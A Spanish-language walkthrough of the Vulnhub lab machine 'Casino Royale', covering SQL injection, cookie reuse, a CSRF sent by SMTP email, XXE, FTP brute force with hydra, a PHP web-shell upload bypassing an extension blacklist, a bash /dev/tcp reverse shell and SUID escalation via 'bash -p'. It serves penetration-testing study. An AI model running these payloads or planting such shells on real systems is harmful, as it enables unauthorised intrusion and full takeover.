---
title: Casino Royale - Vulnhub
description: "Máquina linux de dificultad MEDIUM de la plataforma Vulnhub. Se tratan temas de SQLI, CSRF y permisos SUID"
date: 2024-07-31
pubDate: 2024-07-31
image: /image/vh-writeup-casino-royale/casinoRoyale.png
categories:
  - Vulnhub
  - writeup
tags:
  - smtp
  - sqli
  - ftp
  - suid
  - csrf
  - medium
  - linux
---

<center>
  <img src="/image/vh-writeup-casino-royale/casinoRoyale.png" width="500"/>
</center>

<br/>

Casino Royale es una máquina Linux de nivel medio que puede ser un reto realista, pero también puede llevarte a perder tiempo en _rabbit holes_ debido a sus numerosas funcionalidades y páginas que no conducen a nada. A pesar de ello, existen varias formas de solucionar sus desafíos. En este post, compartiré la ruta que seguí, la cual es solo una de las muchas posibles para completar la máquina.

Ya que la enumeración es algo simple y en este caso tedioso, en la mayoría de casos me lo saltaré e iré directamente a las vulnerabilidades explicando cómo llegué a ellas.

Por útlimo, en vez de usar la IP que tuvo mi máquina usaré `casino-royale.local` la cual tendrá mayor sentido más adelante.

## Índice
- [Índice](#índice)
- [Fase de reconocimiento](#fase-de-reconocimiento)
  - [Reconocimiento de puertos y servicios](#reconocimiento-de-puertos-y-servicios)
- [LeaderBoard](#leaderboard)
- [Pokeradmin](#pokeradmin)
- [Snowfox CMS](#snowfox-cms)
- [Ultra access](#ultra-access)
- [Escalada de privilegios](#escalada-de-privilegios)

<a id="reconocimiento"></a>
## Fase de reconocimiento

### Reconocimiento de puertos y servicios

Empezaremos utilizando `nmap` para descubrir los puertos abiertos accesibles.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -v -oG allPorts casino-royale.local
Nmap scan report for casino-royale.local
Host is up (0.000079s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
80/tcp   open  http
8081/tcp open  blackice-icecap
MAC Address: 08:00:27:F3:F5:0C (Oracle VirtualBox virtual NIC)

```

Podemos observar varios servicios, siendo los más importantes: `ftp`, `smtp` y `http`.

Una vez hemos visto que puertos están abiertos procedemos cuáles son esos servicios y su versión:

```bash
nmap -sCV -p21,25,80,8081 -oN targeted casino-royale.local
Nmap scan report for casino-royale.local
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: casino.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=casino
| Subject Alternative Name: DNS:casino
| Not valid before: 2018-11-17T20:14:11
|_Not valid after:  2028-11-14T20:14:11
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 2 disallowed entries 
|_/cards /kboard
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:F3:F5:0C (Oracle VirtualBox virtual NIC)

```

Las versiones en este caso no son vulnerables.

## LeaderBoard

Una vez, escaneado los puertos procedemos a enumerar el servicio `http`. Si usamos alguna herramienta como `gobuster` podremos ver que existe un `index.php` (`http://casino-royale.local/index.php`).

![](/image/vh-writeup-casino-royale/leaderboard.png)

Si nos fijamos bien, hay una funcionalidad de filtrado de torneos:

![](/image/vh-writeup-casino-royale/leaderboardFunctionality.png)

Si interceptamos la petición con burpsuite podemos ver que que viajan dos parámetros por _POST_: `op` y `tournamentid`:

![](/image/vh-writeup-casino-royale/burpLeaderboard.png)

Si probamos vulnerabilidades en ambos parámetros, daremos con un SQL injection en el parámetro `torunamentid`. 

Al explotar la vulnerabilidad nos damos cuenta que hay varias bases de datos en el servidor:

![](/image/vh-writeup-casino-royale/databases.png)

La más importante es la base de datos `pokerleague` pero la de `vip` nos da información sobre otro lugar del sitio web que ya veremos más adelante.

Dentro de la base de datos `pokerleague` encontraremos con una tabla `pokermax_admin` con las siguientes credenciales: `admin:raise12million`:

![](/image/vh-writeup-casino-royale/pokeradminCredentials.png)

## Pokeradmin

En la fase de fuzzeo web, me encontré con el directorio `/pokeradmin`. Si nos dirigimos allí encontraremos el siguiente login:

![](/image/vh-writeup-casino-royale/login.png)

Si probamos las credenciales anteriores accederemos como admin. 

También podríamos burlar el login realizando un SQLI Bypass:

![](/image/vh-writeup-casino-royale/sqli%20bypass.png)

Por último, una vez logueados, podemos observar la siguiente cookie:

![](/image/vh-writeup-casino-royale/adminCookie.png)

Si probamos a setearnos esta cookie sin estar logueados y accedemos a `main.php`, nos dejará entrar sin pasar por el login.

De esta página, lo que nos interesa es la información de los jugadores que se encuentra en `manage players` y la info la podemos consultar dándole al botón `Edit info`:

![](/image/vh-writeup-casino-royale/infoPlayers.png)

La información que nos interesa se encuentra en el jugador Valenka:

![](/image/vh-writeup-casino-royale/infoValenka.png)

Es el único que tiene email y habla sobre la ruta `/vip-client-portfolios/?uri=blog`. Esta ruta también la podríamos haber conseguido en la base de datos `vip` mencionada anteriormente que corresponde a la de esta sección de la página web. En esta base de datos se encuentran los usuarios y contraseña del blog, pero están hasheados y tienen aplicado un _salt_ por lo que es complicado crackearlos.

En la información también hablan de que están en `casino-royale.local` que es como me he estado refiriendo a la máquina todo este tiempo. Si visitamos a `http://<ip>/vip-client-portfolios/?uri=blog` podremos observar que las imágenes no cargan. Para que lo hagan deberás de cambiar tu `/etc/hosts` para que `casino-royale.local` redirija a la ip de la máquina.

## Snowfox CMS

Si nos dirigimos a `http://casino-royale.local/vip-client-portfolios/?uri=blog` podremos ver lo siguiente:

![](/image/vh-writeup-casino-royale/snowFox.png)

Si buscamos en `searchsploit` alguna vulnerabilidad de `Snowfox CMS` encontraremos lo siguiente:

![](/image/vh-writeup-casino-royale/searchsploit.png)

Existe una vulnerabilidad de Cross-Site Request Forgery. Esta es una vulnerabilidad de tipo _Client Side_, es decir, es necesario de la interacción de un usuario para que se produzca.

Si nos fijamos en el último post, podremos encontrar una pista:

![](/image/vh-writeup-casino-royale/postPista.png)

Tenemos una manera para que un usuario administrador ejecute el CSRF. 

Para ello:
  - El email tiene que ir dirigido a valenka cuyo email está en `Pokeradmin` y es `valenka`
  - En el asunto del email debe de estar un usuario, que será uno de los jugadores que vimos en `Pokeradmin`. En mi caso escogí a `obanno`.
  - Poner un link, que lleve a una página que hosteemos nosotros que contendrá el código HTML malicioso con el CSRF.

Comandos necesarios para enviar el correo:

```smtp
telnet <ip> 25
mail from: nombre
rcpt to: valenka
data
subject: obanno

http://<nuestra ip>/mailicious.html

.
quit
```

> Se deben de respetar los saltos de línea.

En el caso del HTML, me traje el que encontramos en `searchsploit` con:

```bash
searchspoit -m php/webapps/35301.html
```

Y lo renombré a `malicious.html`.

>  Hay que adaptar el código a nuestro caso específico

Luego hostee un servicio `http` con python en esa misma carpeta:

```py
python3 -m http.server 80
```

Después de que valenka caiga en el CSRF, podremos entrar en el sitio como el usuario que definimos en el `HTML` el cual tendrá privilegios de administrador.

Una vez más, si nos dirigimos al apartado de los usuarios y vemos su información, obtendremos más pistas. En este caso, es el usuario `le` el que nos la da.

![](/image/vh-writeup-casino-royale/snowManageUsers.png)

![](/image/vh-writeup-casino-royale/leUser.png)

En este caso, obtenemos una nueva ruta llamada `/ultra-access-view/main.php`.

## Ultra access

Si nos dirigimos a `http://casino-royale.local/ultra-access-view/main.php` nos aparecerá lo siguiente:

![](/image/vh-writeup-casino-royale/ultraAccess.png)

Si vemos el código de la página veremos la siguiente pista:

![](/image/vh-writeup-casino-royale/pistaXML.png)

Parece ser que acepta por `POST` la siguiente estructura XML:

```xml
<creds>
  <customer>username</customer>
  <password>password</password>
</creds>
```

Si probamos a enviar esta estructura por `POST` veremos la siguiente respuesta:

![](/image/vh-writeup-casino-royale/xmlPost.png)

Podemos ver que efectivamente la página web interpreta el username y lo refleja en la página web. Si probamos a hacer un XXE, veremos que es posible leer del fichero `/etc/passwd`:

![](/image/vh-writeup-casino-royale/xxe.png)

Podemos observar que hay un usuario llamado `ftpUserULTRA`. Podemos intentar a crackear la contraseña del usuario con el diccionario `rockyou.txt` e `hydra` por el servicio ftp:

```bash
hydra -l ftpUserULTRA -P rockyou.txt ftp://<ip> -t 20
```

Da como resultado la contraseña `bankbank` y así podemos entrar en el servicio `ftp`.

Hay que recalcar que si entramos en `http://casino-royal.local/ultra-access-view` entramos en una página de _directory listing_ que refleja los ficheros a los que vamos a acceder a continuación por ftp.

Para poder ganar acceso a la máquina debemos de subir un archivo `php` por ftp. El mío será el siguiente:

```php
<?php echo system($_GET['command']); ?>
```

Si intentamos subirlo con el comando de `ftp` `mget` no nos dejará ya que aplica una blacklist de extensiones. Si cambiamos la extensión a `php3` si nos deja.

Para que nos interprete el exploit necesitaremos dar permisos de lectura al archivo en el servidor `ftp` con:

```bash
chmod 777 exploit.php3
```

Una vez hecho esto debemos de dirigirnos a nuestro exploit desde la url desde `http://casino-royal.local/ultra-access-view` y en mi caso escribir la siguiente reverse shell en bash:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1' 
```

En burpsuite quedaría así:

![](/image/vh-writeup-casino-royale/rce.png)

Yo usaré el puerto `443` para entablar la reverse shell:

```bash
nc -nlvp 443
```

## Escalada de privilegios

Una vez en la máquina, buscamos por binarios con privilegios SUID:

```
find / -perm -4000 2>/dev/null
```

Y nos encontramos con lo siguiente:

![](/image/vh-writeup-casino-royale/suid.png)

Es un archivo propio de la máquina. Si lo ejecutamos dice lo siguiente:

![](/image/vh-writeup-casino-royale/SUIDejecutado.png)

Dice que necesita de un archivo `run.sh`. Probamos un archivo creado por nosotros con el mismo nombre y que contenga lo siguiente:

```bash
#!/bin/bash

bash -p
```

Si ejecutamos ahora el binario estaremos como `root`:

![](/image/vh-writeup-casino-royale/root.png)

Por último, solo quedaría ver la flag:

![](/image/vh-writeup-casino-royale/flagBash.png)

![](/image/vh-writeup-casino-royale/flagFinal.png)




